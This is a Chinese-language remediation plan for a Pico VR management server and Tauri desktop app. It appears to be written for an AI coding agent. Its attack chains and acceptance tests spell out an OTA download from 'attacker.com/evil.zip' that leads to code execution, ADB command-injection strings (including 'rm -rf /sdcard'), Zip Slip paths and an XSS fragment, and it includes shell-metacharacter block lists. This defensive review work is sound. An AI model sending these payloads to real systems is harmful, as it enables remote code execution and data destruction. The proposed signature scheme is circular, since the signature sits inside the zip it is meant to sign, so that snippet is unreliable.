# Pico 硬件管理系统 — 代码修复计划文档 V2
> **用途**：交给 Antigravity 执行修改的完整任务清单。
> **基线**：第一轮审查报告 + 第二轮增量审查（2026-11-17）。
> **原则**：所有变更在独立分支/PR 完成，严禁直接推主分支。每项任务合入前必须通过验收。
> **路径约定**：所有路径相对仓库根 `F:\Sun\AIProgram\Pico设备控制\`。行号基于审查快照，实际编辑以最新代码为准。

---

## 目录
- [第一部分：本轮新增高危问题（最高优先级）](#第一部分本轮新增高危问题最高优先级)
- [第二部分：第一轮遗留 P0（仍未执行）](#第二部分第一轮遗留-p0仍未执行)
- [第三部分：第一轮遗留 P1（稳定性与并发）](#第三部分第一轮遗留-p1稳定性与并发)
- [第四部分：本轮新增 P1/P2](#第四部分本轮新增-p1p2)
- [第五部分：架构建议](#第五部分架构建议)
- [第六部分：执行检查清单](#第六部分执行检查清单)

---

## 第一部分：本轮新增高危问题（最高优先级）

> 这些问题是第一轮修复计划未覆盖的**新增攻击面**，其中 NEW-1 是当前整个项目最严重的漏洞（RCE），必须排在所有任务之前。

### NEW-1【极高·RCE】OTA 远程下载 → 热替换可执行文件，无鉴权

**位置**
- `src/PicoManager.Server/Controllers/OtaController.cs:52-67`（`POST /api/ota/download`）
- `src/PicoManager.Server/Services/OtaService.cs:140-156`（`ApplyUpdateFromUrlAsync`）
- `src/PicoManager.Server/Services/OtaService.cs:40-138`（解压覆盖 `baseDir` + `taskkill` + `start` 重启）

**攻击链**：局域网任意设备 → `POST http://server:8999/api/ota/download` body `{"url":"http://attacker.com/evil.zip"}` → 服务端 `HttpClient.GetAsync` 下载 → `ZipFile.ExtractToDirectory` 解压 → `robocopy` 覆盖服务端 exe 目录 → `taskkill /F /IM PicoManager.Server.exe` → `start PicoManager.Server.exe`。服务器以当前用户权限执行任意代码。

**修改方案（三管齐下，缺一不可）**

#### 1. 下载源白名单（OtaService.cs）
```csharp
// OtaService.cs 顶部新增
private static readonly HashSet<string> AllowedDownloadHosts = new(StringComparer.OrdinalIgnoreCase)
{
    // 从配置读取，见下方 config.json 新增 Ota:AllowedDownloadHosts
};

private bool IsAllowedDownloadUrl(string url)
{
    if (!Uri.TryCreate(url, UriKind.Absolute, out var uri)) return false;
    // 仅允许 https
    if (uri.Scheme != "https") return false;
    // 主机名必须在白名单
    return AllowedDownloadHosts.Contains(uri.Host);
}
```

`ApplyUpdateFromUrlAsync` 开头加校验：
```csharp
public async Task<(bool Success, string Message)> ApplyUpdateFromUrlAsync(string url)
{
    if (!IsAllowedDownloadUrl(url))
    {
        _logger.LogWarning("[OTA] 拒绝非白名单下载源: {Url}", url);
        return (false, "下载源不在白名单内，已拒绝");
    }
    // ... 原有逻辑
}
```

#### 2. 更新包签名校验（OtaService.cs）
在 `ApplyUpdateFromStreamAsync` 解压前加签名校验：
```csharp
// 解压前：校验 zip 内必须包含 signature.sig（RSA 签名）
// 签名覆盖 update.zip 的 SHA256
var tempZip = Path.Combine(stagingDir, "update.zip");
await zipStream.CopyToAsync(new FileStream(tempZip, FileMode.Create));
var zipHash = SHA256.HashData(await File.ReadAllBytesAsync(tempZip));

// 从 zip 内读取 signature.sig 与 manifest.json
using var archive = ZipFile.OpenRead(tempZip);
var sigEntry = archive.GetEntry("signature.sig");
var manifestEntry = archive.GetEntry("manifest.json");
if (sigEntry == null || manifestEntry == null)
    return (false, "更新包缺少签名或清单，已拒绝");

// 用预置公钥验签（公钥硬编码或从 config.json:Ota:PublicKey 读取）
var publicKey = /* 从配置加载 RSA 公钥 */;
using var rsa = RSA.Create();
rsa.ImportFromPem(publicKey);
var sig = /* 读取 sigEntry 内容 */;
if (!rsa.VerifyHash(zipHash, sig, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1))
    return (false, "更新包签名校验失败，已拒绝");
archive.Dispose();
// ... 原有解压逻辑
```

#### 3. 鉴权（依赖 P0-1，见第二部分）
`POST /api/ota/download` 与 `POST /api/ota/upload` 必须经过 P0-1 的鉴权中间件。在 OtaController 上加 `[Authorize]` 或在中间件里对 `/api/ota` 路径强制要求 `X-Api-Key`。

**config.json 新增**
```json
{
  "Ota": {
    "AllowedDownloadHosts": ["your-cdn.example.com", "pico-ota.yourdomain.com"],
    "PublicKey": "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----"
  }
}
```

**验收**
- 无 `X-Api-Key` 请求 `/api/ota/download` 返回 401
- `url` 为 `http://attacker.com/evil.zip` 返回 400 “下载源不在白名单内”
- `url` 为 https 但不在白名单返回 400
- 无签名的 zip 上传返回 500 “更新包缺少签名或清单，已拒绝”
- 签名错误的 zip 返回 500 “签名校验失败”
- 合法签名的更新包能正常升级

---

### NEW-2【高·Zip Slip】OTA 与 AdbController 的 zip 解压无路径校验

**位置**
- `src/PicoManager.Server/Services/OtaService.cs:63`（`ZipFile.ExtractToDirectory(tempZip, extractedDir, true)`）
- `src/PicoManager.Server/Controllers/AdbController.cs:234`（`ZipFile.ExtractToDirectory(tempFile, unzipDir, true)`）

**攻击**：恶意 zip 内含 `../../../../Windows/System32/xxx.dll` 条目，`ExtractToDirectory` 会写出目标目录。

**修改方案**：用安全解压替换所有 `ExtractToDirectory` 调用。
```csharp
// 新建 src/PicoManager.Server/Services/SafeZipExtractor.cs
public static class SafeZipExtractor
{
    public static void ExtractToDirectorySafe(string zipPath, string destRoot, bool overwrite = true)
    {
        var fullDestRoot = Path.GetFullPath(destRoot).TrimEnd(Path.DirectorySeparatorChar) + Path.DirectorySeparatorChar;
        using var archive = ZipFile.OpenRead(zipPath);
        foreach (var entry in archive.Entries)
        {
            if (string.IsNullOrWhiteSpace(entry.Name)) continue;
            var destPath = Path.GetFullPath(Path.Combine(destRoot, entry.FullName));
            if (!destPath.StartsWith(fullDestRoot, StringComparison.OrdinalIgnoreCase))
                throw new InvalidOperationException($"Zip Slip 检测: {entry.FullName} 越界");
            if (overwrite && File.Exists(destPath)) File.Delete(destPath);
            entry.ExtractToFile(destPath, overwrite);
        }
    }
}
```

替换两处调用：
```csharp
// OtaService.cs:63
SafeZipExtractor.ExtractToDirectorySafe(tempZip, extractedDir, true);

// AdbController.cs:234
SafeZipExtractor.ExtractToDirectorySafe(tempFile, unzipDir, true);
```

**验收**
- 上传含 `../../../evil.txt` 的 zip 到 `/api/ota/upload` 返回 500 “Zip Slip 检测”
- 上传含 `../../../evil.txt` 的 zip 到 `/api/adb/upload-push` 返回 500
- 合法 zip 正常解压

---

### NEW-3【高】AdbController 全系列无鉴权 + ADB 命令注入

**位置**
- `src/PicoManager.Server/Controllers/AdbController.cs` 全部端点
- `src/PicoManager.Server/Services/AdbService.cs:398,439,467,489,528,538,544`

**注入点**
| 端点 | AdbService 拼接 | 注入 payload 示例 |
|------|----------------|-------------------|
| `POST /api/adb/uninstall` | `AdbService.cs:467` `uninstall "{packageName}"` | `{"packageName":"com.x; reboot"}` |
| `POST /api/adb/mkdir` | `AdbService.cs:439` `mkdir -p "{normalized}"` | `{"remotePath":"/sdcard/$(reboot)"}` |
| `POST /api/adb/upload-push` | `AdbService.cs:544` `push "{localPath}" "{normalizedRemote}"` | `{"remotePath":"/sdcard/\"; reboot; \""}` |

**修改方案**

#### 1. 输入校验工具类（新建）
```csharp
// src/PicoManager.Server/Services/InputValidators.cs
public static class InputValidators
{
    // 包名：字母开头，仅含字母数字点下划线
    private static readonly Regex PackageNameRegex = new(@"^[a-zA-Z][a-zA-Z0-9._]*$", RegexOptions.Compiled);
    // 目标：IP:port 或 SN（字母数字-_:）
    private static readonly Regex TargetRegex = new(@"^[a-zA-Z0-9._:-]+$", RegexOptions.Compiled);
    // 远程路径：以 / 开头，禁止 shell 元字符
    private static readonly Regex RemotePathRegex = new(@"^/[a-zA-Z0-9._/\-]*$", RegexOptions.Compiled);

    public static bool IsValidPackageName(string? s) => !string.IsNullOrWhiteSpace(s) && PackageNameRegex.IsMatch(s);
    public static bool IsValidTarget(string? s) => !string.IsNullOrWhiteSpace(s) && TargetRegex.IsMatch(s);
    public static bool IsValidRemotePath(string? s) => !string.IsNullOrWhiteSpace(s) && RemotePathRegex.IsMatch(s);

    // ADB 参数转义：含空格/引号/分号/$/反引号时拒绝（不做转义，直接拒绝更安全）
    public static bool ContainsShellMeta(string? s) =>
        !string.IsNullOrEmpty(s) && s.IndexOfAny(new[] { '"', '\'', ';', '$', '`', '&', '|', '>', '<', '\n', '\r' }) >= 0;
}
```

#### 2. 在每个 AdbController 端点入口加校验
```csharp
// AdbController.cs 示例
[HttpPost("uninstall")]
public async Task<IActionResult> Uninstall([FromBody] AdbUninstallRequest req)
{
    if (!InputValidators.IsValidPackageName(req.PackageName))
        return BadRequest(new { success = false, message = "包名非法，仅允许字母数字点下划线" });
    if (req.Targets != null && req.Targets.Any(t => !InputValidators.IsValidTarget(t)))
        return BadRequest(new { success = false, message = "目标设备标识非法" });
    // ... 原有逻辑
}

[HttpPost("mkdir")]
public async Task<IActionResult> CreateFolder([FromBody] AdbMkdirRequest req)
{
    if (!InputValidators.IsValidRemotePath(req.RemotePath))
        return BadRequest(new { success = false, message = "远程路径非法" });
    // ... 原有逻辑
}

[HttpPost("upload-push")]
public async Task<IActionResult> UploadAndPush(...)
{
    if (!string.IsNullOrWhiteSpace(remotePath) && !InputValidators.IsValidRemotePath(remotePath))
        return BadRequest(new { success = false, message = "远程路径非法" });
    // ... 原有逻辑
}
```

#### 3. 鉴权（依赖 P0-1）
`AdbController` 全部端点必须经过 P0-1 鉴权中间件。

**验收**
- 无 `X-Api-Key` 访问 `/api/adb/*` 返回 401
- `packageName: "com.x; reboot"` 返回 400
- `remotePath: "/sdcard/$(reboot)"` 返回 400
- 合法请求正常执行

---

### NEW-4【高】前端 OTA 用相对路径 `fetch('/api/ota/...')`，Tauri 桌面端不通

**位置**：`src-tauri/ui/app.js:1986,2024,2067,2097`

**问题**：Tauri webview 的 origin 是 `tauri://localhost` 或 `http://tauri.localhost`，相对路径 `/api/ota/...` 不会自动转发到 `127.0.0.1:8999`，OTA 在桌面端直接 404。

**修改方案**：改用统一的 `apiCall` 或新增 OTA 专用 Tauri command。

#### 方案 A（推荐）：新增 Rust OTA command 走 IPC
```rust
// src-tauri/src/commands/ota.rs (新建)
use serde::Serialize;
use std::time::Duration;
use tauri::command;

#[derive(Serialize)]
pub struct OtaResult { pub success: bool, pub message: String }

#[command]
pub async fn ota_get_version(port: Option<u16>) -> Result<serde_json::Value, String> {
    let p = port.unwrap_or(8999);
    let client = reqwest::Client::builder().timeout(Duration::from_secs(5)).build().map_err(|e| e.to_string())?;
    let text = client.get(format!("http://127.0.0.1:{}/api/ota/version", p)).send().await
        .map_err(|e| e.to_string())?.text().await.map_err(|e| e.to_string())?;
    serde_json::from_str(&text).map_err(|e| e.to_string())
}

#[command]
pub async fn ota_download(port: Option<u16>, url: String) -> Result<OtaResult, String> {
    let p = port.unwrap_or(8999);
    let client = reqwest::Client::builder().timeout(Duration::from_secs(300)).build().map_err(|e| e.to_string())?;
    let res = client.post(format!("http://127.0.0.1:{}/api/ota/download", p))
        .json(&serde_json::json!({"url": url})).send().await.map_err(|e| e.to_string())?;
    let status = res.status();
    let text = res.text().await.unwrap_or_default();
    if status.is_success() {
        Ok(serde_json::from_str(&text).unwrap_or(OtaResult { success: false, message: text }))
    } else {
        Err(format!("HTTP {}: {}", status, text))
    }
}
```
在 `lib.rs` 的 `generate_handler!` 注册 `ota_get_version, ota_download`。

前端 `app.js` 改用：
```javascript
const invoke = getTauriInvoke();
const info = await invoke('ota_get_version', { port: 8999 });
// ...
await invoke('ota_download', { port: 8999, url: otaUrl });
```

#### 方案 B（快速）：前端改用 `apiCall` + 完整 URL
```javascript
// 把 fetch('/api/ota/version') 改为
const info = await apiCall('GET', '/api/ota/version');
// 上传仍用 XHR（apiCall 不支持 FormData），但 URL 改为绝对地址
xhr.open('POST', 'http://127.0.0.1:8999/api/ota/upload');
```

**验收**
- Tauri 桌面端 OTA 弹窗“查询版本”能返回版本号
- “上传更新包”能成功上传
- “远程下载”能触发下载

---

### NEW-5【中】AdbService 硬编码 `G:\Program Files\platform-tools\adb.exe`

**位置**：`src/PicoManager.Server/Services/AdbService.cs:44-62`

**修改方案**
```csharp
// config.json 新增
{
  "Adb": {
    "Path": ""  // 留空则自动探测
  }
}

// AdbService.cs
public static string ResolveAdbPath()
{
    // 1. 优先读配置
    var cfgPath = /* 读取 config.json:Adb:Path */;
    if (!string.IsNullOrWhiteSpace(cfgPath) && File.Exists(cfgPath)) return cfgPath;

    // 2. 自动探测（去掉硬编码的 G:\ 路径）
    var candidates = new[]
    {
        Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "adb.exe"),
        Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "platform-tools", "adb.exe"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Android\Sdk\platform-tools\adb.exe"),
    };
    foreach (var cand in candidates)
        if (File.Exists(cand)) return cand;

    return "adb"; // fallback to PATH
}
```

**验收**
- 删除 `G:\Program Files\platform-tools\adb.exe` 后服务仍能在有 adb 的机器上正常扫描设备
- `config.json:Adb:Path` 配置自定义路径生效

---

### NEW-6【中】`ScanAndAutoConnectAsync` 64 并发无速率限制

**位置**：`src/PicoManager.Server/Services/AdbService.cs:298-357`

**修改方案**
1. `/api/adb/scan` 加鉴权（依赖 P0-1）
2. 加结果缓存：同一子网 30 秒内重复扫描直接返回缓存
3. 降低并发到 32，超时 600ms 保持

```csharp
// AdbService.cs 新增
private static readonly ConcurrentDictionary<string, (DateTime At, List<AdbDeviceInfo> Devices)> _scanCache = new();
private static readonly TimeSpan ScanCacheTtl = TimeSpan.FromSeconds(30);

public async Task<List<AdbDeviceInfo>> ScanAndAutoConnectAsync(string? customSubnet = null, int timeoutMs = 600)
{
    var cacheKey = customSubnet ?? "auto";
    if (_scanCache.TryGetValue(cacheKey, out var cached) && DateTime.UtcNow - cached.At < ScanCacheTtl)
        return cached.Devices;

    // ... 原有扫描逻辑，并发降到 32 ...
    var result = await GetConnectedDevicesAsync();
    _scanCache[cacheKey] = (DateTime.UtcNow, result);
    return result;
}
```

**验收**
- 连续两次 `/api/adb/scan` 30 秒内第二次走缓存，不实际扫描
- 无鉴权访问返回 401

---

## 第二部分：第一轮遗留 P0（仍未执行）

> 以下任务来自 `CODE_REVIEW_FIX_PLAN.md` 的 P0-1～P0-6，截至本轮审查**全部未动**。请 Antigravity 按原方案执行。

### P0-1 统一鉴权中间件（HTTP / SignalR / UDP / Deployer）

| 目标 | 文件 | 修改点 |
|------|------|--------|
| **C# Server** | `src/PicoManager.Server/Program.cs` | 新增 `ApiKeyMiddleware`（读 `config.json:ApiKey`，校验 `X-Api-Key` Header）；`app.UseMiddleware<ApiKeyMiddleware>()` 在 `UseRouting()` 前；SignalR `MapHub<PicoHub>("/hubs/pico").RequireAuthorization()` + 自定义 `AuthorizeAttribute` 读 Header |
| **C# Deployer** | `tools/PicoDeployer/Program.cs` | 同理加中间件，复用同一 `ApiKey` |
| **UDP 8998** | `src/PicoManager.Server/Services/UdpCommandService.cs` | `ReceiveAsync` 后立即校验 `remoteEndPoint.Address` 在白名单（`config.json:UdpAllowedIPs`）+ 令牌桶限流（每 IP 10 req/s） |
| **Rust Tauri** | `src-tauri/src/commands/server.rs` | `api_proxy` 自动在转发请求头加 `X-Api-Key`（从本地配置读取） |
| **前端** | `src-tauri/ui/app.js` | `apiCall` / `initSignalR` 统一在 Header 带 `X-Api-Key`（从 `systemConfig.apiKey` 读） |
| **配置模板** | `src/PicoManager.Server/config.json` `tools/PicoDeployer/config.json` | 新增 `"ApiKey": "换成强随机串"`, `"UdpAllowedIPs": ["192.168.1.0/24", "10.0.0.0/8"]` |

**验收**：无 Key 请求全部 401；UDP 非白名单 IP 报文被丢弃；前端正常操作无感知。

---

### P0-2 对齐 3 个 ADB 命令参数（恢复无线 ADB 功能）

| 命令 | Rust 现状 | 前端调用 | 修改方案 |
|------|-----------|----------|----------|
| `adb_connect` | `adb_connect(ip: String, port: Option<u16>)` | `invoke('adb_connect', { ipAddress: "192.168.1.50:5555" })` | **Rust 改签名**：`adb_connect(ip_address: String)` 兼容 `ip:port` 格式，内部自动拆分；去掉 `port` 参数 |
| `adb_disconnect` | `adb_disconnect(ip: String, port: Option<u16>)` | `invoke('adb_disconnect', { serial: "192.168.1.50:5555" })` | **Rust 改签名**：`adb_disconnect(serial: String)` 直接传给 `adb disconnect <serial>` |
| `adb_install_apk` | `adb_install_apk(target: String, apk_path: String)` | `invoke('adb_install_apk', { apkPath: "...", serial: null })` | **Rust 改签名**：`adb_install_apk(apk_path: String, target: Option<String>)`；`target=None` 时遍历 `adb devices` 逐个安装 |

**文件**：`src-tauri/src/commands/adb.rs` + `src-tauri/ui/app.js`（3 处调用）
**验收**：前端“无线 ADB 弹窗”连接/断开/批量安装全部成功，控制台无 `invalid args`。

> **注意**：本轮新增的 C# `AdbService` + `AdbController` 已提供完整的 `/api/adb/*` REST 接口，功能远超 Rust 端 `adb.rs`。**强烈建议直接把 Rust 端 `adb.rs` 改为调用 C# `/api/adb/*`**（见第五部分架构建议），而非维护两套重复的 ADB 逻辑。

---

### P0-3 严格 CSP + 关闭 `withGlobalTauri` + 前端去 `innerHTML`

| 文件 | 修改点 |
|------|--------|
| `src-tauri/tauri.conf.json` | `"csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' http://127.0.0.1:8999 ws://127.0.0.1:8999; object-src 'none'; base-uri 'none'; form-action 'none';"`<br>`"withGlobalTauri": false` |
| `src-tauri/ui/app.js` | 全部 `innerHTML`/`onclick=` 拼接处（22 处）→ 改用 `document.createElement` + `textContent` + `addEventListener`；`dev.sn`/`dev.alias`/`url` 等不可信数据严禁拼入 HTML 属性或脚本 |
| `src-tauri/src/commands/adb.rs` | `adb_shell` 彻底移除或加白名单（见 P0-4） |

**验收**：Console 无 CSP 报错；注入 `<img src=x onerror=...>` 的设备别名不再执行脚本。

---

### P0-4 `adb_shell` 命令加白名单 / 彻底下线

| 方案 | 修改点 |
|------|--------|
| **方案 A（推荐）彻底移除** | `src-tauri/src/commands/adb.rs` 删除 `adb_shell` 函数及 `lib.rs` 的 `generate_handler!` 注册；`app.js` 删除对应调用 |
| **方案 B 仅保留只读诊断白名单** | Rust 端 `ALLOWED_SHELL_CMDS = ["getprop", "dumpsys battery", "pm list packages"]`；`adb_shell` 入参 `command` 必须以白名单开头，否则返回 `Err`；前端调用前二次确认 |

**验收**：任意命令注入尝试被拦截。

---

### P0-5 任意本地文件外传漏洞修复（Deployer `/api/deploy/push-file`）

| 文件 | 修改点 |
|------|--------|
| `tools/PicoDeployer/Program.cs` | `LocalFilePath` 禁止绝对路径，仅允许相对 `wwwroot/uploads/` 下的文件名；新增 `UploadsRoot = Path.Combine(AppContext.BaseDirectory, "wwwroot", "uploads")`，规范化后 `Path.GetFullPath` 必须以 `UploadsRoot` 开头；返回 400 “路径越界” |

**验收**：`LocalFilePath: "../../../config.json"` 返回 400。

---

### P0-6 UDP 8998 来源 IP 白名单 + 速率限制

| 文件 | 修改点 |
|------|--------|
| `src/PicoManager.Server/Services/UdpCommandService.cs` | 启动时读 `config.json:UdpAllowedIPs` 解析 CIDR 列表；`ReceiveAsync` 后立即 `if (!IsAllowed(remoteEP.Address)) return;`；每 IP `ConcurrentDictionary<IPAddress, TokenBucket>`（10 req/s, burst 20） |

**验收**：非白名单 IP 报文被静默丢弃；单 IP 超频返回 `rate_limited`。

---

## 第三部分：第一轮遗留 P1（稳定性与并发）

> 以下来自 `CODE_REVIEW_FIX_PLAN.md` 的 P1-1～P1-13，截至本轮审查**基本未动**。请 Antigravity 按原方案执行。

### P1-1 Rust async 命令去同步阻塞
| 命令 | 现状 | 修改 |
|------|------|------|
| 全部 ADB 命令 | `Command::new("adb").output()` | `tokio::process::Command::new("adb").args(...).output().await` |
| `start_server_process` / `stop_server_process` | `std::process::Command::spawn()` / `taskkill` | `tokio::process::Command` + `spawn()` 保存 `Child` 句柄 |
| `send_udp_command` | `std::net::UdpSocket` 同步 | `tokio::net::UdpSocket` |
| `load_config_json` / `save_config_json` | `fs::read_to_string` / `fs::write` | `tokio::fs` + **原子写：temp + rename** |

**文件**：`src-tauri/src/commands/adb.rs` `server.rs` `network.rs` `config.rs`
**验收**：`cargo test` 通过；并发 20 个 `adb_list_devices` 不卡 UI。

---

### P1-2 `start_server_process` 互斥 + Child 句柄保存 + 精准停止
| 文件 | 修改点 |
|------|--------|
| `src-tauri/src/commands/server.rs` | 新增 `static SERVER_CHILD: Mutex<Option<Child>>`；`start_server_process` 加锁，已有 `Child` 且 `try_wait().is_none()` 直接返回；`spawn()` 成功后保存 `Child`；`stop_server_process` 取出 `Child` 调用 `child.kill().await`，失败再 fallback `taskkill`；移除 `SERVER_RUNNING` AtomicBool |

**验收**：快速点击“启动服务”/托盘“重启”不再产生多进程；停止服务精准杀掉唯一子进程。

---

### P1-3 `api_proxy` 端口动态化 + Method 白名单 + 错误不吞
| 文件 | 修改点 |
|------|--------|
| `src-tauri/src/commands/server.rs` | 新增参数 `port: Option<u16>`；`method` 白名单 `["GET","POST","PUT","DELETE","PATCH"]`；`res.text().await` 改 `match` 不吞错 |
| `src-tauri/ui/app.js` | `apiCall` 调用 `api_proxy` 时透传 `port: systemConfig.webPort` |

**验收**：修改配置端口后代理自动生效；非法 method 被拦截。

---

### P1-4 补全 Tauri `capabilities/` 目录
| 文件 | 内容 |
|------|------|
| `src-tauri/capabilities/default.json`（新建） | `{"$schema":"https://schema.tauri.app/config/2/capability","identifier":"default","description":"默认权限集","windows":["main"],"permissions":["core:default","core:window:allow-close","core:window:allow-show","core:window:allow-hide","core:window:allow-set-focus","core:tray:allow-icon","core:tray:allow-menu","core:tray:allow-tooltip","opener:default"]}` |

**验收**：`tauri dev` 启动无权限报错。

---

### P1-5 配置读写路径稳健化 + 原子写
| 文件 | 修改点 |
|------|--------|
| `src-tauri/src/commands/config.rs` | `get_config_path()` 优先用 `tauri::path::BaseDirectory::AppConfig`；`save_config_json` 写 `config.json.tmp` → `fs::rename` 原子替换；移除硬编码 `F:\Sun\...` 候选路径 |

**验收**：便携版/安装版/开发模式配置位置一致；断电不损坏配置。

---

### P1-6 C# UDP 自检 `ReceiveAsync` 竞态修复
| 文件 | 修改点 |
|------|--------|
| `src/PicoManager.Server/Controllers/ConfigController.cs` | `TestUdpMessage` 改用 `CancellationTokenSource` + `ReceiveAsync(cts.Token)`，移除 `using var client` 包裹的 `ReceiveTimeout` 无效模式 |

**验收**：并发 10 次“测试 UDP”不抛 `ObjectDisposedException`。

---

### P1-7 `PicoSdkService.StopAsync` 等待遥测任务退出
| 文件 | 修改点 |
|------|--------|
| `src/PicoManager.Server/Services/PicoSdkService.cs` | `StopAsync` 先 `_cts?.Cancel()`，再 `await _telemetryTask`，最后 `Deinit()`；`_telemetryTask` 循环配合 `await Task.Delay(100, _cts.Token)` |

**验收**：应用关闭时日志无 native 崩溃；`Deinit` 后无回调触发。

---

### P1-8 `DeploymentEngine` 并发互斥
| 文件 | 修改点 |
|------|--------|
| `tools/PicoDeployer/Core/DeploymentEngine.cs` | `private readonly SemaphoreSlim _gate = new(1, 1);`；每个 `RunBatchXxxAsync` 开头 `if (!await _gate.WaitAsync(0)) throw new InvalidOperationException("另一批量任务正在进行");`；`finally { _gate.Release(); }` |

**验收**：并发调用 `/api/deploy/install` + `/api/deploy/push-file` 其中一个返回 409。

---

### P1-9 屏幕帧转换移出回调线程 + 限频前置
| 文件 | 修改点 |
|------|--------|
| `src/PicoManager.Server/Services/ScreenMonitorService.cs` | `HandleRawFrame` 先限频（45ms）再拷贝指针数据，`Task.Run` 交给线程池转码 |
| `src/PicoManager.Server/Services/ScreenConverter.cs` | `BgraToJpeg` 接受 `byte[]` 而非 `IntPtr` |

**验收**：高帧率下 SDK 回调线程无阻塞。

---

### P1-10 移除“伪唤醒”测试逻辑
| 文件 | 修改点 |
|------|--------|
| `src/PicoManager.Server/Services/PicoDeviceManager.cs` | 删除 `Reboot`/`Shutdown` 中 `if (!_sdkActive || sn.StartsWith("P4E-88"))` 后的 `Task.Run` 延时伪造在线代码 |

**验收**：重启/关机后设备状态保持“离线”直到真实心跳上报。

---

### P1-11 配置对象并发保护
| 文件 | 修改点 |
|------|--------|
| `src/PicoManager.Server/Services/ConfigService.cs` | `ReaderWriterLockSlim` 包裹 `CurrentConfig` 读写；`SaveConfig` 写锁 + 原子写 |
| `src/PicoManager.Server/Controllers/ConfigController.cs` | `Projects`/`HeadsetAliases` 增删改全部走 `ConfigService` 方法 |
| `src/PicoManager.Server/Services/PicoDeviceManager.cs` | `UnbindHeadset` 调用 `ConfigService.RemoveAlias(sn)` |

**验收**：并发 100 次修改配置 + SDK 回调同时写 alias，无异常无脏写。

---

### P1-12 ADB 命令拼接转义 / 白名单
| 文件 | 修改点 |
|------|--------|
| `tools/PicoDeployer/Core/AdbManager.cs` | 所有拼接参数处加 `ArgumentEscaper.Escape(arg)`；`packageName`/`apkPath` 正则校验 |
| `tools/PicoDeployer/Program.cs` | `shell "cat '{safePath}'"` 先校验 `safePath` 无单引号/反引号/`$()` |

**验收**：恶意输入 `"; rm -rf /sdcard; "` 被拒绝或安全转义。

---

### P1-13 全链路 HTTPS（自签证书 + 强制重定向）
| 文件 | 修改点 |
|------|--------|
| `src/PicoManager.Server/Program.cs` | `dotnet dev-certs https --trust`；Kestrel `UseHttps`；`app.UseHttpsRedirection()` |
| `tools/PicoDeployer/Program.cs` | 同理配置 HTTPS 端口（建议 8997） |
| `src-tauri/src/commands/network.rs` `server.rs` | `web_url` 改 `https://` |
| `src-tauri/ui/app.js` | `initSignalR` `withUrl('https://...')`；`fetch`/`apiCall` 改 `https://` |

**验收**：浏览器地址栏显示 🔒；抓包无明文指令。

---

## 第四部分：本轮新增 P1/P2

### P1-14 前端 OTA 改走 `apiCall` 或 Rust command
见 NEW-4，已在第一部分详述。

### P1-15 AdbService adb 路径迁入配置
见 NEW-5，已在第一部分详述。

### P1-16 `ScanAndAutoConnectAsync` 加缓存与限流
见 NEW-6，已在第一部分详述。

### P2-21 统一日志：移除所有空 `catch {}`
- Rust：`tracing_subscriber::fmt::init()`
- C#：统一 `ILogger`，移除 `Program.cs:54,114`、`PicoServiceModeHelper.cs`、`UdpCommandService.cs`、`ScreenMonitorService.cs`、`StreamController.cs`、`AdbController.cs:172,262,264`、`AdbService.cs:285,333,351` 等空 catch

### P2-22 Rust 端 adb.rs 改为调用 C# `/api/adb/*`
- 删除 `src-tauri/src/commands/adb.rs` 中重复的 ADB 逻辑
- `adb_connect`/`adb_disconnect`/`adb_install_apk`/`adb_list_devices` 改为 `api_proxy` 调用 C# `/api/adb/*`
- 前端 `app.js` 的 ADB 弹窗改调 `/api/adb/*`（已经是 REST，统一走 `apiCall`）

### P2-23 前端统计 ID 对齐
- `app.js:397-400` `stat-online`/`stat-running`/`stat-low`/`stat-offline` → HTML 实际是 `top-stat-online`/`top-stat-running`/`top-stat-offline`/`top-stat-total`
- 补齐 `stat-low` 或移除 JS 写入

### P2-24 前端音量滑块防抖
- `app.js:503-513` `oninput`/`onchange` 抖动 → 防抖 200ms

### P2-25 文档同步
- 更新 `PicoVR统一管理系统_开发与架构设计文档.md` 同步上述安全/架构变更

---

## 第五部分：架构建议

### 建议 1：删除 Rust 端重复的 ADB 逻辑，统一走 C# `/api/adb/*`
当前两套 ADB 实现并存：
- Rust `src-tauri/src/commands/adb.rs`（142 行，同步阻塞，参数与前端不匹配）
- C# `src/PicoManager.Server/Services/AdbService.cs`（560 行，异步完善）

**建议**：
1. Rust `adb.rs` 的 `adb_connect`/`adb_disconnect`/`adb_install_apk`/`adb_list_devices`/`adb_push_file`/`adb_reboot_device`/`adb_shell` 全部改为 `api_proxy` 调用 C# `/api/adb/*`
2. `lib.rs` 的 `generate_handler!` 保留命令名（前端不用改），但内部实现转发
3. 删除 Rust 端的 `run_adb` 函数和 `std::process::Command` 依赖

**收益**：单一 ADB 实现，参数校验、超时、进度回调统一在 C# 侧；Rust 侧不再阻塞。

### 建议 2：OTA 安全模型
OTA 是当前最危险的攻击面，建议建立三层防御：
1. **鉴权**：`X-Api-Key`（P0-1）
2. **来源白名单**：仅允许配置 `Ota:AllowedDownloadHosts` 的 https 源
3. **签名校验**：RSA 公钥验签 zip 的 SHA256

三者缺一不可。上传 OTA 包（`/api/ota/upload`）同样需要鉴权 + 签名校验。

### 建议 3：前端统一走 `apiCall`
当前前端 OTA 用裸 `fetch('/api/ota/...')`，与项目其他部分的 `apiCall` → `api_proxy` IPC 代理不一致。建议：
- 所有 GET/POST JSON 请求统一走 `apiCall`
- 文件上传（FormData）走 `apiCall` 的新上传分支或 Rust command
- SignalR 连接走 `api_proxy` 或独立 command

---

## 第六部分：执行检查清单

### 交付前自查
- [ ] 第一部分 NEW-1～NEW-6 全部合入并通过验收
- [ ] 第二部分 P0-1～P0-6 全部合入并通过验收
- [ ] 第三部分 P1-1～P1-13 全部合入并通过验收
- [ ] `cargo test` / `dotnet test` 全绿
- [ ] 手工端到端：启动 Tauri → 托盘启动服务 → 前端连接 → 扫描设备 → 批量启动/暂停/停止 → 实时画面 → 无线 ADB 安装 → OTA 上传/远程下载 → 修改配置 → 关闭服务 → 退出 Tauri
- [ ] 无 CSP 报错、无 401/403 意外、无控制台报错
- [ ] `config.json` 含 `ApiKey` `UdpAllowedIPs` `Ota:AllowedDownloadHosts` `Ota:PublicKey` `Adb:Path`，未提交真实密钥
- [ ] 更新 `CHANGELOG.md` 记录破坏性变更（HTTPS 端口、API Key、ADB 参数、OTA 签名）

### 建议执行顺序
